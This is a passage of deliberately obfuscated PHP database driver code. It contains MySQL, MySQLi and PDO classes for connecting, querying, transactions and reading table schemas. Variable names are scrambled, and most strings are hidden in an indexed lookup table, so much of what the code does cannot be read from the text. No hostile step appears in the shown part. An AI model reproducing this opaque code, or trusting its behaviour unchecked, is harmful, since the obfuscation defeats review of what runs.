"\x3a{$ÇÆ“º²[$ªÕØë˜[1050]]}" : $ªÕØë˜[12]); $õĞ—î©Ö = !empty($ÇÆ“º²[$ªÕØë˜[17]][$ªÕØë˜[18]]) ? $ÇÆ“º²[$ªÕØë˜[17]][$ªÕØë˜[18]] : $this->pconnect; if ($õĞ—î©Ö) { $this->linkID[$µŒğå½²] = mysql_pconnect($ÊÙõüÙ£, $ÇÆ“º²[$ªÕØë˜[1051]], $ÇÆ“º²[$ªÕØë˜[1052]], 131072); } else { $this->linkID[$µŒğå½²] = mysql_connect($ÊÙõüÙ£, $ÇÆ“º²[$ªÕØë˜[1051]], $ÇÆ“º²[$ªÕØë˜[1052]], !0, 131072); } if (!$this->linkID[$µŒğå½²] || !empty($ÇÆ“º²[$ªÕØë˜[21]]) && !mysql_select_db($ÇÆ“º²[$ªÕØë˜[21]], $this->linkID[$µŒğå½²])) { think_exception(mysql_error()); } $ãõ‚ô¡ = mysql_get_server_info($this->linkID[$µŒğå½²]); mysql_query($ªÕØë˜[1053] . think_config($ªÕØë˜[1054]) . $ªÕØë˜[58], $this->linkID[$µŒğå½²]); if ($ãõ‚ô¡ > $ªÕØë˜[1055]) { mysql_query($ªÕØë˜[1056], $this->linkID[$µŒğå½²]); } $this->connected = !0; if (1 != think_config($ªÕØë˜[22])) { unset($this->config); } } return $this->linkID[$µŒğå½²]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¿ããà¹Ò) { $¹³’¨šÁ =& $_SERVER[µÅ˜º…æ]; if (0 === stripos($¿ããà¹Ò, $¹³’¨šÁ[342])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¿ããà¹Ò; if ($this->queryID) { $this->free(); } think_action_status($¹³’¨šÁ[23], 1); think_status($¹³’¨šÁ[24]); $this->queryID = mysql_query($¿ããà¹Ò, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($•ë×ÏÑ) { $ÌÈè‰Â§ =& $_SERVER[µÅ˜º…æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $•ë×ÏÑ; if ($this->queryID) { $this->free(); } think_action_status($ÌÈè‰Â§[25], 1); think_status($ÌÈè‰Â§[24]); $±…ªÇÓ™ = mysql_query($•ë×ÏÑ, $this->_linkID); $this->debug(); if (!1 === $±…ªÇÓ™) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[µÅ˜º…æ][1057], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Âø¥Ñ—ş = mysql_query($_SERVER[µÅ˜º…æ][1058], $this->_linkID); $this->transTimes = 0; if (!$Âø¥Ñ—ş) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $½òØ¦¢ = mysql_query($_SERVER[µÅ˜º…æ][1059], $this->_linkID); $this->transTimes = 0; if (!$½òØ¦¢) { $this->error(); return !1; } } return !0; } private function getAll() { $‚Ú™› = array(); if ($this->numRows > 0) { while ($‘Œ¡´Ã« = mysql_fetch_assoc($this->queryID)) { $‚Ú™›[] = $‘Œ¡´Ã«; } mysql_data_seek($this->queryID, 0); } return $‚Ú™›; } public function getFields($Æ¢çÙúÌ) { $«äºä =& $_SERVER[µÅ˜º…æ]; $¸¶Ï˜Ãí = $this->query($«äºä[1060] . $this->parseKey($Æ¢çÙúÌ)); $Ş²¤¯¤ = array(); if ($¸¶Ï˜Ãí) { foreach ($¸¶Ï˜Ãí as $±åïËê => $×–ÁÒ¯) { $Ş²¤¯¤[$×–ÁÒ¯[$«äºä[31]]] = array($«äºä[32] => $×–ÁÒ¯[$«äºä[31]], $«äºä[33] => $×–ÁÒ¯[$«äºä[34]], $«äºä[35] => (bool) (strtoupper($×–ÁÒ¯[$«äºä[36]]) === $«äºä[1061]), $«äºä[37] => $×–ÁÒ¯[$«äºä[38]], $«äºä[39] => strtolower($×–ÁÒ¯[$«äºä[40]]) == $«äºä[41], $«äºä[42] => strtolower($×–ÁÒ¯[$«äºä[43]]) == $«äºä[44]); } } return $Ş²¤¯¤; } public function getTables($ë¾©â¡Ã = '') { $—‘€ÑªÎ =& $_SERVER[µÅ˜º…æ]; if (!empty($ë¾©â¡Ã)) { $êûü¨Œ™ = $—‘€ÑªÎ[1062] . $ë¾©â¡Ã . $—‘€ÑªÎ[1063]; } else { $êûü¨Œ™ = $—‘€ÑªÎ[1064]; } $’¯ù‡†© = $this->query($êûü¨Œ™); $¿àƒŸ = array(); foreach ($’¯ù‡†© as $ç‡ôÆÕ => $¸œÏÎÕû) { $¿àƒŸ[$ç‡ôÆÕ] = current($¸œÏÎÕû); } return $¿àƒŸ; } public function replace($¡¿ŸÕºü, $µÏõ­Ÿ = array()) { $²»ìÑ³è =& $_SERVER[µÅ˜º…æ]; foreach ($¡¿ŸÕºü as $Õ’ı¿ªÌ => $ÅåŸÃã) { $ÄáÜ×¿¶ = $this->parseValue($ÅåŸÃã); if (is_scalar($ÄáÜ×¿¶)) { $—äØåú´[] = $ÄáÜ×¿¶; $ı¨ˆ„À¹[] = $this->parseKey($Õ’ı¿ªÌ); } } $É„™ƒû = $²»ìÑ³è[1065] . $this->parseTable($µÏõ­Ÿ[$²»ìÑ³è[357]]) . $²»ìÑ³è[1066] . implode($²»ìÑ³è[50], $ı¨ˆ„À¹) . $²»ìÑ³è[1067] . implode($²»ìÑ³è[50], $—äØåú´) . $²»ìÑ³è[1068]; return $this->execute($É„™ƒû); } public function insertAll($¸†¬Ì¬, $§óÇÕ™¡ = array(), $˜åĞ‡ = false) { $ãıå§É =& $_SERVER[µÅ˜º…æ]; if (!is_array($¸†¬Ì¬[0])) { return !1; } $Ï•Ä˜í = array_keys($¸†¬Ì¬[0]); $æúêìÁ = array(); foreach ($¸†¬Ì¬ as $Ú†”¬õÀ) { $”àãÆ—Ù = array(); foreach ($Ú†”¬õÀ as $çÖ‚ğõ => $È„ÂÚª”) { $È„ÂÚª” = $this->parseValue($È„ÂÚª”); if (is_scalar($È„ÂÚª”)) { $”àãÆ—Ù[] = $È„ÂÚª”; } } $æúêìÁ[] = $ãıå§É[337] . implode($ãıå§É[50], $”àãÆ—Ù) . $ãıå§É[1068]; } array_walk($Ï•Ä˜í, array($this, $ãıå§É[1069])); $Ñ‚ó¹Š = $˜åĞ‡ ? $ãıå§É[1070] : $ãıå§É[1071]; $Ñ‚ó¹Š = $ãıå§É[1071]; $ê§´¸ïê = $Ñ‚ó¹Š . $ãıå§É[1072] . $this->parseTable($§óÇÕ™¡[$ãıå§É[357]]) . $ãıå§É[1066] . implode($ãıå§É[50], $Ï•Ä˜í) . $ãıå§É[1073] . implode($ãıå§É[50], $æúêìÁ); if ($˜åĞ‡) { $À¹ı®  = array(); foreach ($Ï•Ä˜í as $çÖ‚ğõ) { if ($çÖ‚ğõ == $ãıå§É[231] || $çÖ‚ğõ == $ãıå§É[1074]) { continue; } $À¹ı® [] = $çÖ‚ğõ . $ãıå§É[1075] . $çÖ‚ğõ . $ãıå§É[1068]; } $ê§´¸ïê .= $ãıå§É[1076] . implode($ãıå§É[50], $À¹ı® ); } return $this->execute($ê§´¸ïê); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ó·±ì‰ =& $_SERVER[µÅ˜º…æ]; $this->error = mysql_errno() . $Ó·±ì‰[4] . mysql_error($this->_linkID); if ($Ó·±ì‰[12] != $this->queryStr) { $this->error .= LNG($Ó·±ì‰[48]) . $this->queryStr; } think_trace($this->error, $Ó·±ì‰[12], $Ó·±ì‰[49]); return $this->error; } public function escapeString($ïË»‘¸) { if ($this->_linkID) { return mysql_real_escape_string($ïË»‘¸, $this->_linkID); } else { return mysql_escape_string($ïË»‘¸); } } public function parseKey(&$Ú¨ó¢Ô®, $æÏñ¸¢İ = true) { $£æ¼Ùªú =& $_SERVER[µÅ˜º…æ]; if ($æÏñ¸¢İ) { $Ú¨ó¢Ô® = $this->parseKeyCheck($Ú¨ó¢Ô®); } if ($Ú¨ó¢Ô® != $£æ¼Ùªú[220] && !preg_match($£æ¼Ùªú[1077], $Ú¨ó¢Ô®)) { $Ú¨ó¢Ô® = $£æ¼Ùªú[475] . trim($Ú¨ó¢Ô®, $£æ¼Ùªú[475]) . $£æ¼Ùªú[475]; } return $Ú¨ó¢Ô®; } } class DbMysqli extends Db { public function __construct($¹Àªé = '') { $ú‚óÃ— =& $_SERVER[µÅ˜º…æ]; if (!extension_loaded($ú‚óÃ—[1078])) { think_exception(think_lang($ú‚óÃ—[14]) . $ú‚óÃ—[1079]); } if (!empty($¹Àªé)) { $this->config = $¹Àªé; if (empty($this->config[$ú‚óÃ—[17]])) { $this->config[$ú‚óÃ—[17]] = $ú‚óÃ—[12]; } } } public function connect($çÜ¬œ¾ = '', $ƒùê¶À = 0) { $éµşØÈ =& $_SERVER[µÅ˜º…æ]; if (!isset($this->linkID[$ƒùê¶À])) { if (empty($çÜ¬œ¾)) { $çÜ¬œ¾ = $this->config; } $this->linkID[$ƒùê¶À] = new mysqli($çÜ¬œ¾[$éµşØÈ[1049]], $çÜ¬œ¾[$éµşØÈ[1051]], $çÜ¬œ¾[$éµşØÈ[1052]], $çÜ¬œ¾[$éµşØÈ[21]], $çÜ¬œ¾[$éµşØÈ[1050]] ? intval($çÜ¬œ¾[$éµşØÈ[1050]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ëºİô£á = $this->linkID[$ƒùê¶À]->server_version; $this->linkID[$ƒùê¶À]->query($éµşØÈ[1053] . think_config($éµşØÈ[1054]) . $éµşØÈ[58]); if ($Ëºİô£á > $éµşØÈ[1055]) { $this->linkID[$ƒùê¶À]->query($éµşØÈ[1056]); } $this->connected = !0; if (1 != think_config($éµşØÈ[22])) { unset($this->config); } } return $this->linkID[$ƒùê¶À]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¥òØ¬Á¢) { $¶öÂãõ• =& $_SERVER[µÅ˜º…æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¥òØ¬Á¢; if ($this->queryID) { $this->free(); } think_action_status($¶öÂãõ•[23], 1); think_status($¶öÂãõ•[24]); $this->queryID = $this->_linkID->query($¥òØ¬Á¢); if ($this->_linkID->more_results()) { while (($ÊğâıšÓ = $this->_linkID->next_result()) != NULL) { $ÊğâıšÓ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÀÙ‘Ş¯Ö) { $Ñ­³âÕ¥ =& $_SERVER[µÅ˜º…æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÀÙ‘Ş¯Ö; if ($this->queryID) { $this->free(); } think_action_status($Ñ­³âÕ¥[25], 1); think_status($Ñ­³âÕ¥[24]); $ ¼Üéë† = $this->_linkID->query($ÀÙ‘Ş¯Ö); $this->debug(); if (!1 === $ ¼Üéë†) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ºÀêÕŸ¾ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ºÀêÕŸ¾) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $õ§š‰¸ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$õ§š‰¸) { $this->error(); return !1; } } return !0; } private function getAll() { $æ”¿ìÂ = array(); if ($this->numRows > 0) { for ($ÉÅŞâ† = 0; $ÉÅŞâ† < $this->numRows; $ÉÅŞâ†++) { $æ”¿ìÂ[$ÉÅŞâ†] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $æ”¿ìÂ; } public function getFields($÷½±²ôŞ) { $©Õğ³–û =& $_SERVER[µÅ˜º…æ]; $ÙÁË»á = $this->query($©Õğ³–û[1060] . $this->parseKey($÷½±²ôŞ)); $×ıôƒÚê = array(); if ($ÙÁË»á) { foreach ($ÙÁË»á as $‹ç¾àè¹ => $‹§õ©Á‰) { $×ıôƒÚê[$‹§õ©Á‰[$©Õğ³–û[31]]] = array($©Õğ³–û[32] => $‹§õ©Á‰[$©Õğ³–û[31]], $©Õğ³–û[33] => $‹§õ©Á‰[$©Õğ³–û[34]], $©Õğ³–û[35] => (bool) ($‹§õ©Á‰[$©Õğ³–û[36]] === $©Õğ³–û[12]), $©Õğ³–û[37] => $‹§õ©Á‰[$©Õğ³–û[38]], $©Õğ³–û[39] => strtolower($‹§õ©Á‰[$©Õğ³–û[40]]) == $©Õğ³–û[41], $©Õğ³–û[42] => strtolower($‹§õ©Á‰[$©Õğ³–û[43]]) == $©Õğ³–û[44]); } } return $×ıôƒÚê; } public function getTables($¾ğÖÙ³Š = '') { $àöÏ™ŒÛ =& $_SERVER[µÅ˜º…æ]; $íÓ°Õ± = !empty($¾ğÖÙ³Š) ? $àöÏ™ŒÛ[1062] . $¾ğÖÙ³Š . $àöÏ™ŒÛ[1063] : $àöÏ™ŒÛ[1064]; $ã–…¢„å = $this->query($íÓ°Õ±); $õ­şë·å = array(); if ($ã–…¢„å) { foreach ($ã–…¢„å as $ğ¾°‡¶º => $‘Îñ³ïÁ) { $õ­şë·å[$ğ¾°‡¶º] = current($‘Îñ³ïÁ); } } return $õ­şë·å; } public function replace($¯Ö×÷ , $¶÷ã˜ˆ = array()) { $¤ˆßã·Ç =& $_SERVER[µÅ˜º…æ]; foreach ($¯Ö×÷  as $¬ìéí½ú => $ûÈ»ºÃÜ) { $ùÚ•Ü­Ü = $this->parseValue($ûÈ»ºÃÜ); if (is_scalar($ùÚ•Ü­Ü)) { $âåÑ“«[] = $ùÚ•Ü­Ü; $¬‘ä‹áè[] = $this->parseKey($¬ìéí½ú); } } $ •Öí² = $¤ˆßã·Ç[1065] . $this->parseTable($¶÷ã˜ˆ[$¤ˆßã·Ç[357]]) . $¤ˆßã·Ç[1066] . implode($¤ˆßã·Ç[50], $¬‘ä‹áè) . $¤ˆßã·Ç[1067] . implode($¤ˆßã·Ç[50], $âåÑ“«) . $¤ˆßã·Ç[1068]; return $this->execute($ •Öí²); } public function insertAll($ßİë®´‘, $µüâÙ = array(), $íª–Åœ = false) { $½Ï¬€ =& $_SERVER[µÅ˜º…æ]; if (!is_array($ßİë®´‘[0])) { return !1; } $ÚàŞ“™ = array_keys($ßİë®´‘[0]); $çû·šŠí = array(); foreach ($ßİë®´‘ as $–¸¿ÊÂ) { $áõà‚Ÿ¾ = array(); foreach ($–¸¿ÊÂ as $Œ››ª‡Ş => $ÙÛ¡ò¦é) { $ÙÛ¡ò¦é = $this->parseValue($ÙÛ¡ò¦é); if (is_scalar($ÙÛ¡ò¦é)) { $áõà‚Ÿ¾[] = $ÙÛ¡ò¦é; } } $çû·šŠí[] = $½Ï¬€[337] . implode($½Ï¬€[50], $áõà‚Ÿ¾) . $½Ï¬€[1068]; } array_walk($ÚàŞ“™, array($this, $½Ï¬€[1069])); $ï§Ä½Û = $íª–Åœ ? $½Ï¬€[1070] : $½Ï¬€[1071]; $ï§Ä½Û = $½Ï¬€[1071]; $Û«×—€Â = $ï§Ä½Û . $½Ï¬€[1072] . $this->parseTable($µüâÙ[$½Ï¬€[357]]) . $½Ï¬€[1066] . implode($½Ï¬€[50], $ÚàŞ“™) . $½Ï¬€[1073] . implode($½Ï¬€[50], $çû·šŠí); if ($íª–Åœ) { $­ÖæÕ©— = array(); foreach ($ÚàŞ“™ as $Œ››ª‡Ş) { if ($Œ››ª‡Ş == $½Ï¬€[231] || $Œ››ª‡Ş == $½Ï¬€[1074]) { continue; } $­ÖæÕ©—[] = $Œ››ª‡Ş . $½Ï¬€[1075] . $Œ››ª‡Ş . $½Ï¬€[1068]; } $Û«×—€Â .= $½Ï¬€[1076] . implode($½Ï¬€[50], $­ÖæÕ©—); } return $this->execute($Û«×—€Â); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $•ªÀù¥Š =& $_SERVER[µÅ˜º…æ]; $this->error = $this->_linkID->errno . $•ªÀù¥Š[4] . $this->_linkID->error; if ($•ªÀù¥Š[12] != $this->queryStr) { $this->error .= LNG($•ªÀù¥Š[48]) . $this->queryStr; } think_trace($this->error, $•ªÀù¥Š[12], $•ªÀù¥Š[49]); return $this->error; } public function escapeString($ïä¬ÌÍ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ïä¬ÌÍ); } else { return addslashes($ïä¬ÌÍ); } } public function parseKey(&$Øå¬¸ßò, $À¶óãî´ = true) { $è‚¥Áø =& $_SERVER[µÅ˜º…æ]; if ($À¶óãî´) { $Øå¬¸ßò = $this->parseKeyCheck($Øå¬¸ßò); } if ($Øå¬¸ßò != $è‚¥Áø[220] && !preg_match($è‚¥Áø[1077], $Øå¬¸ßò)) { $Øå¬¸ßò = $è‚¥Áø[475] . trim($Øå¬¸ßò, $è‚¥Áø[475]) . $è‚¥Áø[475]; } return $Øå¬¸ßò; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($œ©œ™®Æ = '') { $½öŞíáü =& $_SERVER[µÅ˜º…æ]; if (!class_exists($½öŞíáü[1080])) { think_exception(think_lang($½öŞíáü[14]) . $½öŞíáü[1081]); } if (!empty($œ©œ™®Æ)) { $this->config = $œ©œ™®Æ; if (empty($this->config[$½öŞíáü[17]])) { $this->config[$½öŞíáü[17]] = array(); } } } public function connect($˜ç±˜•È = '', $–Õç¼Á = 0) { $ø¬Ÿİş =& $_SERVER[µÅ˜º…æ]; if (!isset($this->linkID[$–Õç¼Á])) { if (empty($˜ç±˜•È)) { $˜ç±˜•È = $this->config; } $ŞòÛ·… = !empty($˜ç±˜•È[$ø¬Ÿİş[17]][$ø¬Ÿİş[18]]) ? $˜ç±˜•È[$ø¬Ÿİş[17]][$ø¬Ÿİş[18]] : $this->pconnect; if ($ŞòÛ·…) { $˜ç±˜•È[$ø¬Ÿİş[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$–Õç¼Á] = new PDO($˜ç±˜•È[$ø¬Ÿİş[1082]], $˜ç±˜•È[$ø¬Ÿİş[1051]], $˜ç±˜•È[$ø¬Ÿİş[1052]], $˜ç±˜•È[$ø¬Ÿİş[17]]); } catch (PDOException $§Ø»Õ˜¾) { think_exception($§Ø»Õ˜¾->getMessage()); } $this->dbType = $this->_getDsnType($˜ç±˜•È[$ø¬Ÿİş[1082]]); if (in_array($this->dbType, array($ø¬Ÿİş[1083], $ø¬Ÿİş[1084], $ø¬Ÿİş[1085], $ø¬Ÿİş[1086]))) { think_exception($ø¬Ÿİş[1087] . $this->dbType . $ø¬Ÿİş[1088] . $this->dbType . $ø¬Ÿİş[1089]); } if (!$this->linkID[$–Õç¼Á]) { think_exception($ø¬Ÿİş[1090]); } try { $this->linkID[$–Õç¼Á]->exec($ø¬Ÿİş[1091] . think_config($ø¬Ÿİş[1054])); } catch (Exception $§Ø»Õ˜¾) { } $this->connected = !0; if (1 != think_config($ø¬Ÿİş[22])) { unset($this->config); } } return $this->linkID[$–Õç¼Á]; } public function free() { $this->PDOStatement = null; } public function query($­ûÍ¤Œ, $•ÄìŠ¨¤ = array()) { $ŸÜÈ“Ë› =& $_SERVER[µÅ˜º…æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $­ûÍ¤Œ; if (!empty($•ÄìŠ¨¤)) { $this->queryStr .= $ŸÜÈ“Ë›[1092] . print_r($•ÄìŠ¨¤, !0) . $ŸÜÈ“Ë›[1093]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ŸÜÈ“Ë›[23], 1); think_status($ŸÜÈ“Ë›[24]); $this->PDOStatement = $this->_linkID->prepare($­ûÍ¤Œ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $İ”ŒËø‹ = $this->PDOStatement->execute($•ÄìŠ¨¤); $this->debug(); if (!1 === $İ”ŒËø‹) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ú–¾÷‰ú, $îØÂô™ï = array()) { $Œ©¦û¶ç =& $_SERVER[µÅ˜º…æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ú–¾÷‰ú; if (!empty($îØÂô™ï)) { $this->queryStr .= $Œ©¦û¶ç[1092] . print_r($îØÂô™ï, !0) . $Œ©¦û¶ç[1093]; } $§ØÅÁ¦© = !1; if ($this->dbType == $Œ©¦û¶ç[1086]) { if (preg_match($Œ©¦û¶ç[1094], $this->queryStr, $±ñŒòĞ’)) { $this->table = think_config($Œ©¦û¶ç[1095]) . str_ireplace(think_config($Œ©¦û¶ç[1096]), $Œ©¦û¶ç[463], $±ñŒòĞ’[2]); $§ØÅÁ¦© = (bool) $this->query($Œ©¦û¶ç[1097] . strtoupper($this->table) . $Œ©¦û¶ç[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Œ©¦û¶ç[25], 1); think_status($Œ©¦û¶ç[24]); $this->PDOStatement = $this->_linkID->prepare($ú–¾÷‰ú); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‚Ó¨Ó± = $this->PDOStatement->execute($îØÂô™ï); $this->debug(); if (!1 === $‚Ó¨Ó±) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($§ØÅÁ¦© || preg_match($Œ©¦û¶ç[1098], $ú–¾÷‰ú)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ì‹¯â¤Í = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ì‹¯â¤Í) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $„‚ÌÀ²å = $this->_linkID->rollback(); $this->transTimes = 0; if (!$„‚ÌÀ²å) { $this->error(); return !1; } } return !0; } private function getAll() { $òïëº‚ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($òïëº‚); return $òïëº‚; } public function getFields($äúÔ¡Ä) { $¯ğÊ´Û =& $_SERVER[µÅ˜º…æ]; $this->initConnect(!0); if (think_config($¯ğÊ´Û[1099])) { $àÎ©á³ = str_replace($¯ğÊ´Û[1100], $äúÔ¡Ä, think_config($¯ğÊ´Û[1099])); } else { switch ($this->dbType) { case $¯ğÊ´Û[1083]: case $¯ğÊ´Û[1101]: $àÎ©á³ = "\123\105\114\105\x43\124\x20\x20\x20\x63\x6f\154\165\155\x6e\x5f\x6e\141\x6d\x65\40\141\x73\40\x27\x4e\x61\155\x65\x27\54\x20\x20\40\144\x61\164\x61\x5f\x74\171\x70\145\x20\x61\163\x20\x27\x54\171\160\145\47\54\40\x20\x20\143\157\154\165\155\x6e\x5f\144\x65\x66\x61\165\x6c\x74\x20\x61\x73\x20\x27\104\x65\146\x61\165\154\164\47\54\x20\40\40\x69\163\x5f\156\x75\x6c\154\141\142\x6c\x65\40\141\x73\40\x27\116\x75\154\154\x27\12\x9\x9\106\122\x4f\115\x9\151\156\146\x6f\x72\x6d\x61\164\151\x6f\x6e\x5f\x73\x63\150\145\155\141\56\x74\x61\142\x6c\x65\x73\x20\x41\x53\40\x74\12\x9\11\x4a\x4f\x49\x4e\x9\151\x6e\146\157\x72\x6d\141\164\x69\157\156\137\163\143\150\145\x6d\141\56\x63\157\154\x75\155\156\163\40\x41\x53\40\x63\xa\x9\11\x4f\x4e\x20\x20\x74\56\x74\141\142\154\145\137\143\141\x74\141\x6c\157\147\40\75\40\143\56\x74\x61\x62\154\x65\x5f\143\x61\164\x61\154\x6f\x67\xa\11\11\101\116\x44\x20\x74\56\x74\x61\142\154\145\137\x73\x63\x68\x65\x6d\x61\x20\x3d\40\x63\x2e\x74\x61\x62\154\145\137\x73\143\150\x65\x6d\141\xa\x9\11\101\x4e\x44\x20\164\56\x74\141\x62\x6c\145\x5f\156\x61\155\x65\x20\x3d\x20\x63\x2e\164\141\142\154\x65\x5f\156\141\155\x65\12\x9\x9\x57\x48\105\122\x45\x20\x20\x20\164\x2e\164\141\142\x6c\x65\x5f\156\x61\x6d\x65\x20\75\40\47{$äúÔ¡Ä}\x27"; break; case $¯ğÊ´Û[1102]: $àÎ©á³ = $¯ğÊ´Û[1103] . $äúÔ¡Ä . $¯ğÊ´Û[1104]; break; case $¯ğÊ´Û[1084]: case $¯ğÊ´Û[1086]: $àÎ©á³ = $¯ğÊ´Û[1105] . $¯ğÊ´Û[1106] . $¯ğÊ´Û[1107] . strtoupper($äúÔ¡Ä) . $¯ğÊ´Û[1108] . strtoupper($äúÔ¡Ä) . $¯ğÊ´Û[1109]; break; case $¯ğÊ´Û[1110]: $àÎ©á³ = $¯ğÊ´Û[1111] . $äúÔ¡Ä . $¯ğÊ´Û[1112]; break; case $¯ğÊ´Û[1085]: break; case $¯ğÊ´Û[1113]: default: $àÎ©á³ = $¯ğÊ´Û[1114] . ($this->dbType == $¯ğÊ´Û[1113] ? "\140{$äúÔ¡Ä}\x60" : $äúÔ¡Ä); } } $óí‘¼ú = $this->query($àÎ©á³); $Ñ›ş’İ = array(); if ($óí‘¼ú) { foreach ($óí‘¼ú as $ºáÂ˜şŒ => $Îïø•‘Í) { $Îïø•‘Í = array_change_key_case($Îïø•‘Í); $Îïø•‘Í[$¯ğÊ´Û[32]] = isset($Îïø•‘Í[$¯ğÊ´Û[32]]) ? $Îïø•‘Í[$¯ğÊ´Û[32]] : $¯ğÊ´Û[463]; $Îïø•‘Í[$¯ğÊ´Û[33]] = isset($Îïø•‘Í[$¯ğÊ´Û[33]]) ? $Îïø•‘Í[$¯ğÊ´Û[33]] : $¯ğÊ´Û[463]; $İ¯í‰û = isset($Îïø•‘Í[$¯ğÊ´Û[351]]) ? $Îïø•‘Í[$¯ğÊ´Û[351]] : $Îïø•‘Í[$¯ğÊ´Û[32]]; $Ñ›ş’İ[$İ¯í‰û] = array($¯ğÊ´Û[32] => $İ¯í‰û, $¯ğÊ´Û[33] => $Îïø•‘Í[$¯ğÊ´Û[33]], $¯ğÊ´Û[35] => (bool) (isset($Îïø•‘Í[$¯ğÊ´Û[103]]) && $Îïø•‘Í[$¯ğÊ´Û[103]] === $¯ğÊ´Û[12] || isset($Îïø•‘Í[$¯ğÊ´Û[35]]) && $Îïø•‘Í[$¯ğÊ´Û[35]] === $¯ğÊ´Û[12]), $¯ğÊ´Û[37] => isset($Îïø•‘Í[$¯ğÊ´Û[37]]) ? $Îïø•‘Í[$¯ğÊ´Û[37]] : (isset($Îïø•‘Í[$¯ğÊ´Û[56]]) ? $Îïø•‘Í[$¯ğÊ´Û[56]] : $¯ğÊ´Û[463]), $¯ğÊ´Û[39] => isset($Îïø•‘Í[$¯ğÊ´Û[95]]) ? strtolower($Îïø•‘Í[$¯ğÊ´Û[95]]) == $¯ğÊ´Û[41] : (isset($Îïø•‘Í[$¯ğÊ´Û[57]]) ? $Îïø•‘Í[$¯ğÊ´Û[57]] : !1), $¯ğÊ´Û[42] => isset($Îïø•‘Í[$¯ğÊ´Û[1115]]) ? strtolower($Îïø•‘Í[$¯ğÊ´Û[1115]]) == $¯ğÊ´Û[44] : (isset($Îïø•‘Í[$¯ğÊ´Û[95]]) ? $Îïø•‘Í[$¯ğÊ´Û[95]] : !1)); } } return $Ñ›ş’İ; } public function getTables($€úÍ¢šÈ = '') { $¿Ş˜¤„ =& $_SERVER[µÅ˜º…æ]; if (think_config($¿Ş˜¤„[1116])) { $à‡¼Èƒı = str_replace($¿Ş˜¤„[1117], $€úÍ¢šÈ, think_config($¿Ş˜¤„[1116])); } else { switch ($this->dbType) { case $¿Ş˜¤„[1084]: case $¿Ş˜¤„[1086]: $à‡¼Èƒı = $¿Ş˜¤„[1118]; break; case $¿Ş˜¤„[1083]: case $¿Ş˜¤„[1101]: $à‡¼Èƒı = $¿Ş˜¤„[1119]; break; case $¿Ş˜¤„[1110]: $à‡¼Èƒı = $¿Ş˜¤„[1120]; break; case $¿Ş˜¤„[1085]: think_exception(think_lang($¿Ş˜¤„[1121]) . $¿Ş˜¤„[1122]); break; case $¿Ş˜¤„[1102]: $à‡¼Èƒı = $¿Ş˜¤„[45] . $¿Ş˜¤„[46] . $¿Ş˜¤„[47]; break; case $¿Ş˜¤„[1113]: default: if (!empty($€úÍ¢šÈ)) { $à‡¼Èƒı = $¿Ş˜¤„[1062] . $€úÍ¢šÈ . $¿Ş˜¤„[1063]; } else { $à‡¼Èƒı = $¿Ş˜¤„[1064]; } } } $’éÌÌâ… = $this->query($à‡¼Èƒı); $ô³«Åãî = array(); foreach ($’éÌÌâ… as $‚Ùöéœ => $¸ÆášÅ¥) { $ô³«Åãî[$‚Ùöéœ] = current($¸ÆášÅ¥); } return $ô³«Åãî; } protected function parseLimit($‰ŞªëÒû) { $»şÊ… =& $_SERVER[µÅ˜º…æ]; $¡œÖÌÌ = $»şÊ…[12]; if (!empty($‰ŞªëÒû)) { switch ($this->dbType) { case $»şÊ…[1110]: case $»şÊ…[1102]: $‰ŞªëÒû = explode($»şÊ…[50], $‰ŞªëÒû); if (count($‰ŞªëÒû) > 1) { 